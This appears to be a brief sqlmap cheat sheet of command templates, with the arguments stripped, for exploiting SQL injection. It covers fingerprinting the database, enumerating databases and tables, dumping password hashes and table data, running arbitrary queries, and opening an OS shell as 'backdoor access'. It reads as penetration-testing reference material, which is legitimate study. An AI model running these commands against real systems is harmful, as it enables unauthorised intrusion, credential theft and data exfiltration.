Test URL and POST data and return database banner (if possible)
===============================================================

./sqlmap.py –url="” –data="” –banner

Parse request data and test | request data can be obtained with burp
====================================================================

./sqlmap.py -r

Fingerprint | much more information than banner
===============================================

./sqlmap.py -r –fingerprint

Get database username, name, and hostname
=========================================

./sqlmap.py -r –current-user –current-db –hostname

Check if user is a database admin
=================================

./sqlmap.py -r –is-dba

Get database users and password hashes
======================================

./sqlmap.py -r –users –passwords

Enumerate databases
===================

./sqlmap.py -r –dbs

List tables for one database
============================

./sqlmap.py -r -D –tables

Other database commands
=======================

./sqlmap.py -r -D –columns –schema –count

Enumeration flags
=================

./sqlmap.py -r -D -T -C -U

Extract data
============

./sqlmap.py -r -D -T -C –dump

Execute SQL Query
=================

./sqlmap.py -r –sql-query="”

Append/Prepend SQL Queries
==========================

./sqlmap.py -r –prefix="” –suffix="”

Get backdoor access to sql server | can give shell access
=========================================================

./sqlmap.py -r –os-shell
